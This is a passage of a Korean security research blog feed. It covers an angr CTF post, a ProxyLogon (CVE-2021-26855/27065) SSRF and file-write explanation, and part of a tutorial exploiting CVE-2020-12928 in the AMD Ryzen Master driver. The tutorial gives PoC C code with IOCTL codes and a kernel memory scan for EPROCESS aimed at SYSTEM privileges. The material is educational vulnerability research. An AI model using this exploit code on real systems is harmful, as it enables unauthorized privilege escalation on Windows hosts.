arguments=arguments)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/sim_procedure.py&quot;</span>, line <span class="hljs-number">230</span>, <span class="hljs-keyword">in</span> execute    r = getattr(inst, inst.run_func)(*sim_args, **inst.kwargs)File <span class="hljs-string">&quot;/home/j0ker/.local/lib/python3.8/site-packages/angr/procedures/stubs/UserHook.py&quot;</span>, line <span class="hljs-number">8</span>, <span class="hljs-keyword">in</span> run    result = user_func(self.state)File <span class="hljs-string">&quot;scaffold09.py&quot;</span>, line <span class="hljs-number">42</span>, <span class="hljs-keyword">in</span> skip_check_equals_    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> traceback.format_stack():</code></pre><p>&#xC0AC;&#xC2E4; &#xC774; &#xB54C;&#xBD80;&#xD130; &#xAC10;&#xC774; &#xC654;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB0B4;&#xAC00; &#xAC10;&#xB2F9;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xC601;&#xC5ED;&#xC744; &#xAC74;&#xB4DC;&#xB838;&#xAD6C;&#xB098;&#x2026; &#xC774;&#xAC78; &#xC5B8;&#xC81C; &#xB2E4; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xC788;&#xB0D0;&#x2026; &#xB9C8;&#xAC10;&#xC774; &#xCF54;&#xC55E;&#xC778;&#xB370;&#x2026; &#xD558;&#xC544;&#x2026;</p><p>&#xADF8;&#xB798;&#xC11C; &#xC624;&#xB298;&#xC740; &#xC5EC;&#xAE30;&#xC11C; &#xB05D;!!!! &#xCEAC;&#xCEAC; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC81C;&#xAC00; &#xBD84;&#xC11D;&#xC744; &#xB2E4; &#xD574;&#xC11C; &#xC2DC;&#xB9AC;&#xC988; &#xC911;&#xAC04;&#xC5D0; &#xB530;&#xB85C; &#xC815;&#xB9AC;&#xD574; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B8;&#xC81C; &#xB05D;&#xB0A0;&#xC9C0;&#xB294; &#xC7A5;&#xB2F4;&#xC744; &#xBABB;&#xD558;&#xC9C0;&#xB9CC;&#x2026; &#xADF8;&#xB798;&#xB3C4; &#xAD81;&#xAE08;&#xD55C; &#xC810;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C;&#xB4E0; &#xD574;&#xACB0;&#xC740; &#xD574;&#xC57C;&#xACA0;&#xC8E0;.</p><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xC608;&#xC0C1;&#xBCF4;&#xB2E4; &#xC0BD;&#xC9C8;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xB9CE;&#xC544;&#xC11C; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xC880; &#xB8E8;&#xC988;&#xD574;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC870;&#xD68C;&#xC218;&#xAC00; &#xB9CE;&#xC774; &#xB098;&#xC62C;&#xB9CC;&#xD55C; &#xAE00;&#xB3C4; &#xC544;&#xB2C8;&#xC5B4;&#xC11C; &#xD6C4;&#xB531; &#xC9C4;&#xD589;&#xD574;&#xC57C;&#xD558;&#xB294;&#xB370;&#x2026; &#xB2E4;&#xC74C;&#xC774;&#xB098; &#xB2E4;&#xB2E4;&#xC74C;&#xC5D0;&#xB294; angr_ctf &#xB05D;&#xB0B4;&#xACE0; &#xB9AC;&#xC5BC; CTF &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2F5;&#xB2F5;&#xD558;&#xC2E0; &#xBD84;&#xB4E4;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xC8C4;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xAD81;&#xAE08;&#xD55C; &#xBD80;&#xBD84;&#xC740; &#xADF8;&#xB0E5; &#xB118;&#xC5B4;&#xAC08; &#xC218;&#xAC00; &#xC5C6;&#xC5C8;&#xC5B4;&#xC694; &#x3160;&#x3160; &#xC544;&#xB9C8; &#xB098;&#xBA38;&#xC9C0; &#xBB38;&#xC81C; &#xD478;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C;&#xB3C4; &#xAD81;&#xAE08;&#xD55C;&#xAC8C; &#xB9CE;&#xC774; &#xC788;&#xC744;&#xAC70; &#xAC19;&#xC740;&#xB370;, &#xCD5C;&#xB300;&#xD55C; &#xB2E4; &#xC81C;&#xB300;&#xB85C; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xBA74;&#xC11C; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;(&#xC55E;&#xC73C;&#xB85C;&#xB3C4; &#xB2F5;&#xB2F5;&#xD560; &#xC608;&#xC815;&#xC774;&#xB77C;&#xB294; &#xB73B;).</p><p>&#xADF8;&#xB7FC; &#xC870;-&#xBC14;!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>j0ker</tag>
      
      <tag>angr</tag>
      
      <tag>exploit</tag>
      
      <tag>symbolic_execution</tag>
      
      <tag>newbie</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] A New Attack Surface on MS Exchange Part 1 - ProxyLogon!</title>
    <link href="/2021/08/13/j0ker/2021-08-13/"/>
    <url>/2021/08/13/j0ker/2021-08-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html">https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MS Exchange</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; Pwnie Awards&#xC5D0;&#xC11C; Best Server-Side Bug&#xB85C; &#xC120;&#xC815;&#xB41C; Orange&#xC758; MS Exchange &#xCDE8;&#xC57D;&#xC810; &#xAE00; &#xC785;&#xB2C8;&#xB2E4;! &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD06C;&#xB9AC;&#xD2F0;&#xCEEC;&#xD560; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xC644;&#xC804; &#xC0C8;&#xB85C;&#xC6B4; &#xACF5;&#xACA9; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xCC3E;&#xC558;&#xB2E4;&#xB294; &#xC88B;&#xC740; &#xD3C9;&#xAC00;&#xB97C; &#xBC1B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2021-26855"><a href="#CVE-2021-26855" class="headerlink" title="CVE-2021-26855"></a>CVE-2021-26855</h2><pre><code class="hljs powershell">protected virtual Uri GetTargetBackEndServerUrl() {    this.LogElapsedTime(<span class="hljs-string">&quot;E_TargetBEUrl&quot;</span>);    Uri result;    <span class="hljs-keyword">try</span> {        UrlAnchorMailbox urlAnchorMailbox = this.AnchoredRoutingTarget.AnchorMailbox as UrlAnchorMailbox;        <span class="hljs-keyword">if</span> (urlAnchorMailbox != null) {            result = urlAnchorMailbox.Url;        } <span class="hljs-keyword">else</span> {            UriBuilder clientUrlForProxy = this.GetClientUrlForProxy();            clientUrlForProxy.Scheme = Uri.UriSchemeHttps;            clientUrlForProxy.Host = this.AnchoredRoutingTarget.BackEndServer.Fqdn; //here            clientUrlForProxy.Port = <span class="hljs-number">444</span>;...</code></pre><p>&#xBCF4;&#xBA74; <code>AnchoredRoutingTarget.BackEndServer.Fqdn</code>&#xC5D0;&#xC11C; host &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; host &#xC815;&#xBCF4;&#xB294; &#xCFE0;&#xD0A4;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xB294; &#xAC83;&#xC778;&#xB370; &#xAC00;&#xC838;&#xC624;&#xACE0; Request&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xAC80;&#xC99D;&#xB3C4; &#xC9C4;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">protected override AnchorMailbox ResolveAnchorMailbox() {    HttpCookie httpCookie = base.ClientRequest.Cookies[<span class="hljs-string">&quot;X-AnonResource-Backend&quot;</span>];    <span class="hljs-keyword">if</span> (httpCookie != null) {        this.savedBackendServer = httpCookie.Value;    }    <span class="hljs-keyword">if</span> (!string.IsNullOrEmpty(this.savedBackendServer)) {        base.Logger.Set(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;X-AnonResource-Backend-Cookie&quot;</span>);        <span class="hljs-keyword">if</span> (ExTraceGlobals.VerboseTracer.IsTraceEnabled(<span class="hljs-number">1</span>)) {            ExTraceGlobals.VerboseTracer.TraceDebug&lt;HttpCookie, int&gt;((long)this.GetHashCode(), <span class="hljs-string">&quot;[OwaResourceProxyRequestHandler::ResolveAnchorMailbox]: AnonResourceBackend cookie used: {0}; context {1}.&quot;</span>, httpCookie, base.TraceContext);        }        <span class="hljs-keyword">return</span> new ServerInfoAnchorMailbox(BackEndServer.FromString(this.savedBackendServer), this);  //here    }    <span class="hljs-keyword">return</span> new AnonymousAnchorMailbox(this);</code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; URL&#xC744; &#xC870;&#xC791;&#xD558;&#xB294; &#xAC83;&#xB9CC;&#xC73C;&#xB85C; SSRF&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="CVE-2021-27065"><a href="#CVE-2021-27065" class="headerlink" title="CVE-2021-27065"></a>CVE-2021-27065</h2><p>&#xBA3C;&#xC800; <code>msExchLogonMailbox</code> &#xD5E4;&#xB354;&#xB97C; &#xC218;&#xC815;&#xD558;&#xC5EC; SYSTEM &#xC720;&#xC800; &#xACC4;&#xC815;&#xC758; ECP &#xC138;&#xC158;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="https://1.bp.blogspot.com/-FFb5p1z14TE/YQz_1xyoTNI/AAAAAAAAE3s/9mcld7lD76kPK_3OdE5cJeYIn0t_KcSowCPcBGAYYCw/s2048/upload_1a0b42f94b1e337c5937fc77ff058f0c.png" alt></p><p>DDIService&#xB294; XAML&#xC744; &#xD1B5;&#xD574; powershell &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294;&#xB370;, &#xC544;&#xB798; &#xD568;&#xC218;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; powershell &#xCF54;&#xB4DC;&#xC758; &#xCD9C;&#xB825; &#xB0B4;&#xC6A9;&#xC744; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC5D0; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">public override RunResult Run(DataRow input, DataTable dataTable, DataObjectStore store, <span class="hljs-built_in">Type</span> codeBehind, Workflow.UpdateTableDelegate updateTableDelegate) {    DataRow dataRow = dataTable.Rows[<span class="hljs-number">0</span>];    string value = (string)input[<span class="hljs-type">this.InputVariable</span>];    string path = (string)input[<span class="hljs-type">this.OutputFileNameVariable</span>];    RunResult runResult = new RunResult();    <span class="hljs-keyword">try</span> {        runResult.ErrorOccur = true;        <span class="hljs-keyword">using</span> (StreamWriter streamWriter = new StreamWriter(File.Open(path, FileMode.CreateNew)))        {            streamWriter.WriteLine(value);        }        runResult.ErrorOccur = false;    }        // ...}</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>j0ker</tag>
      
      <tag>microsoft</tag>
      
      <tag>exchange</tag>
      
      <tag>ssrf</tag>
      
      <tag>arbitrary_file_write</tag>
      
      <tag>CVE-2021-26855</tag>
      
      <tag>CVE-2021-27065</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 공대오빠가 알려주는 Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master 분석(3)</title>
    <link href="/2021/08/11/l0ch/windows-driver-part4/"/>
    <url>/2021/08/11/l0ch/windows-driver-part4/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/05/30/l0ch/windows-driver/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 1 - Setting Up Kernel Debugging</a></p><p><a href="https://hackyboiz.github.io/2021/07/14/l0ch/windows-driver-part2/">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 2 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(1)</a></p><p><a href="https://hackyboiz.github.io/2021/07/28/l0ch/windows-driver-part3">&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 3 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(2)</a></p><p>&#xACF5;&#xB300;&#xC624;&#xBE60;&#xAC00; &#xC54C;&#xB824;&#xC8FC;&#xB294; Windows Driver Part 4 - CVE-2020-12928: AMD Ryzen Master &#xBD84;&#xC11D;(3) &#x2190; Now!</p><hr><p>&#xC5B4;&#xB290;&#xB367; &#xC2DC;&#xB9AC;&#xC988; &#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8;&#xB124;&#xC694;! &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; Part 3&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD588;&#xB358; exploit &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB300;&#xB85C; &#xC9C4;&#xD589;&#xD558;&#xB294; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xACFC;&#xC815;&#xC744; PoC &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xC815;&#xB9AC;&#xD55C; &#xAE00;&#xC785;&#xB2C8;&#xB2E4;. &#xC5BC;&#xB978; cmd&#xCC3D;&#xC5D0;&#xC11C; <code>NT AUTHORITY\SYSTEM</code>&#xC744; &#xB744;&#xC6CC;&#xBCF4;&#xC790;&#xAD6C;&#xC694;!</p><p><br></p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h2 id="Parse-EPROCESS"><a href="#Parse-EPROCESS" class="headerlink" title="Parse EPROCESS"></a>Parse EPROCESS</h2><p>&#xBA3C;&#xC800; arbitrary read &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB85C; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xB294; kernel pool&#xC5D0;&#xC11C; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xD1A0;&#xD070;&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>EPROCESS</code> &#xB294; <code>POOL_HEADER</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; &#xC77C;&#xC815;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>POOL_HEADER</code>&#xB294; <code>0x636f7250</code>(Proc)&#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C;&#xB300;&#xB85C; <code>POOL_HEADER</code> &#xAD6C;&#xC870;&#xCCB4;&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> cmd.exePROCESS ffffbd010035b080    SessionId: <span class="hljs-number">1</span>  Cid: <span class="hljs-number">0424</span>    Peb: af3c91000  ParentCid: <span class="hljs-number">0</span>c78    DirBase: <span class="hljs-number">18e84</span>a000  ObjectTable: ffff9e8945b562c0  HandleCount:  <span class="hljs-number">68.</span>    Image: cmd.exe</code></pre><p><img src="/2021/08/11/l0ch/windows-driver-part4/1.png" alt></p><p><code>cmd.exe</code>&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C; <code>0xffffbd010035b080 - 0x80 + 0x4</code> &#xC704;&#xCE58;&#xC5D0; Proc &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p><br></p><p>&#xC774;&#xB7EC;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC77C;&#xC815;&#xD55C;&#xC9C0; &#xB2E4;&#xB978; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC778; <code>lsass.exe</code>&#xB3C4; &#xD55C;&#xBC88; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">PROCESS ffffbd0ffd7480c0    SessionId: <span class="hljs-number">0</span>  Cid: <span class="hljs-number">0294</span>    Peb: <span class="hljs-number">81e2405000</span>  ParentCid: <span class="hljs-number">01f</span>4    DirBase: <span class="hljs-number">233b</span>99000  ObjectTable: ffff9e893b5ff480  HandleCount: <span class="hljs-number">1365.</span>    Image: lsass.exe</code></pre><p><img src="/2021/08/11/l0ch/windows-driver-part4/2.png" alt></p><p><code>lsass.exe</code>&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C; <code>0xffffbd0ffd7480c0 - 0x70 + 0x4</code> &#xC704;&#xCE58;&#xC5D0; Proc &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB124;&#xC694;.</p><p><br></p><p>&#xC74C;.. &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBCC4;&#xB85C; <code>POOL_HEADER</code>&#xC640; <code>EPROCESS</code> &#xC0AC;&#xC774; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xB124;&#xC694;. &#xADF8;&#xB7EC;&#xB098; &#xB450; &#xC0AC;&#xC9C4; &#xBAA8;&#xB450; &#xD30C;&#xB780;&#xC0C9; &#xBC15;&#xC2A4;&#xB97C; &#xBCF4;&#xBA74; <code>EPROCESS</code> &#xC8FC;&#xC18C;&#xC758; &#xD558;&#xC704; 4 bytes &#xAC12;&#xC740; &#xD56D;&#xC0C1; <code>0x00000003</code>&#xC73C;&#xB85C; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; Proc &#xD0DC;&#xADF8;&#xB97C; &#xCC3E;&#xACE0;, &#xD0DC;&#xADF8;&#xB85C;&#xBD80;&#xD130; &#xC57D; <code>0x100</code> &#xC624;&#xD504;&#xC14B; &#xC0AC;&#xC774;&#xC758; <code>0x00000003</code> &#xAC12;&#xC774; &#xC788;&#xB2E4;&#xBA74; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xD2B9;&#xC815;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;! IOCTL <code>0x81112F08</code> &#xB85C; &#xBAA8;&#xB4E0; kernel pool&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB2C8; &#xC6B0;&#xB9AC;&#xAC00; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC2B9;&#xC2DC;&#xD0A4;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>EPROCESS</code> &#xB610;&#xD55C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC624;&#xD504;&#xC14B;&#xACFC; <code>EPROCESS</code> &#xD558;&#xC704; 4 bytes &#xAC12; <code>0x00000003</code>&#xC740; &#xC708;&#xB3C4;&#xC6B0; &#xBE4C;&#xB4DC; &#xBC84;&#xC804;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><p><br></p><p>&#xC6B0;&#xC120; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC11C;&#xCE6D;&#xD558;&#xBA70; <code>Proc</code> &#xD0DC;&#xADF8;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xBAA8;&#xB450; &#xAE30;&#xB85D;&#xD558;&#xAE30; &#xC704;&#xD574; <code>PROC_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC120;&#xC5B8;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    INT64 proc_address[<span class="hljs-number">300</span>];    INT64 page_entry_offset[<span class="hljs-number">300</span>];    INT64 header_size[<span class="hljs-number">300</span>];    INT64 proc_count;} PROC_DATA;</code></pre><p><br></p><p>&#xC774;&#xC81C; &#xC11C;&#xCE6D;&#xD560; &#xBB3C;&#xB9AC; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774; &#xBC94;&#xC704;&#xB294; &#xD638;&#xC2A4;&#xD2B8;&#xC758; &#xC804;&#xCCB4; &#xBA54;&#xBAA8;&#xB9AC;&#xB098; (&#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB294; &#xACBD;&#xC6B0;) &#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xD06C;&#xAE30; &#xB4F1;&#xC5D0; &#xB530;&#xB77C; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC544; &#xC11C;&#xCE6D;&#xD560; &#xBA54;&#xBAA8;&#xB9AC; &#xBC94;&#xC704;&#xAC00; &#xD06C;&#xAC8C; &#xCC28;&#xC774;&#xAC00; &#xB098;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xAC8C; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC81C; &#xACBD;&#xC6B0;&#xB294; &#xD638;&#xC2A4;&#xD2B8; PC 16GB, VM&#xC5D0; 4GB&#xB97C; &#xD560;&#xB2F9;&#xD588;&#xC73C;&#xBA70; <code>0x120000000</code> ~ <code>0x240000000</code> &#xBC94;&#xC704;&#xB85C; &#xC9C0;&#xC815;&#xC744; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEVICE_NAME         <span class="hljs-meta-string">&quot;\\\\\\\\.\\\\AMDRyzenMasterDriverV15&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> WRITE_IOCTL         (DWORD)0x81112F0C</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> READ_IOCTL          (DWORD)0x81112F08</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> START_ADDRESS       (INT64)0x100000000</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STOP_ADDRESS        (INT64)0x240000000</span>...<span class="hljs-function">PROC_DATA <span class="hljs-title">read_memory</span><span class="hljs-params">(HANDLE dHandle)</span></span><span class="hljs-function"></span>{    DWORD dwRet;    PROC_DATA proc_data = { <span class="hljs-number">0</span>, };        DWORD len = <span class="hljs-number">0x1000</span>;    INT64 i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        INT64 read_address = START_ADDRESS + (i * <span class="hljs-number">0x1000</span>);        <span class="hljs-keyword">if</span> (read_address &gt;= END_OF_ADDRESS) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END of Address\\n&quot;</span>);            <span class="hljs-keyword">return</span> proc_data;        }        READ_INPUT_BUFFER input_buff = { read_address, len };        LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);               DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, &amp;dwRet, <span class="hljs-number">0</span>);                INT64 result = (INT64)output_buff + <span class="hljs-number">0xc</span>;        <span class="hljs-keyword">for</span> (INT64 j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0xF60</span>; j += <span class="hljs-number">0x10</span>) {            PINT64 proc_ptr = (PINT64)(result + <span class="hljs-number">0x4</span> + j);            INT32 proc_val = *(PINT32)proc_ptr;            <span class="hljs-keyword">if</span> (proc_val == <span class="hljs-number">0x636f7250</span>) {                <span class="hljs-keyword">for</span> (INT64 k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0xA0</span>; k += <span class="hljs-number">0x10</span>) {                    PINT64 header_ptr = (PINT64)(result + j + k);                    INT32 header_val = *(PINT32)header_ptr;                    <span class="hljs-keyword">if</span> (header_val == <span class="hljs-number">0x00000003</span>) {                        INT64 tmp = read_address + j;                        INT64 modulus = tmp % <span class="hljs-number">0x1000</span>;                        proc_data.page_entry_offset[proc_data.proc_count] = modulus;                        proc_data.proc_address[proc_data.proc_count] = tmp - modulus;                        proc_data.header_size[proc_data.proc_count] = k;                        proc_data.proc_count++;                        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Proc chunks found\\n&quot;</span>, proc_data.proc_count);                                           }                }                            }        }        i++;    }}...</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB294; <code>0x120000000</code> ~ <code>0x240000000</code> &#xC0AC;&#xC774; Proc &#xD0DC;&#xADF8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xBAA8;&#xB450; &#xCC3E;&#xB294; &#xB8E8;&#xD2F4;&#xC785;&#xB2C8;&#xB2E4;.</p><p><br></p><pre><code class="hljs c">INT64 read_address = START_ADDRESS + (i * <span class="hljs-number">0x1000</span>);<span class="hljs-keyword">if</span> (read_address &gt;= END_OF_ADDRESS) {<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;END of Address\\n&quot;</span>);<span class="hljs-keyword">return</span> proc_data;}</code></pre><p>&#xC77D;&#xC744; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; <code>0x120000000</code>&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574; Page &#xD06C;&#xAE30;&#xC778; <code>0x1000</code> &#xB2E8;&#xC704;&#xB85C; &#xC99D;&#xAC00;&#xC2DC;&#xD0A4;&#xBA70; &#xC11C;&#xCE6D;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><br></p><pre><code class="hljs c">READ_INPUT_BUFFER input_buff = { read_address, len };LPVOID output_buff = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100c</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);       DeviceIoControl(dHandle, READ_IOCTL, &amp;input_buff, <span class="hljs-number">0x40</span>, output_buff, <span class="hljs-number">0x100c</span>, 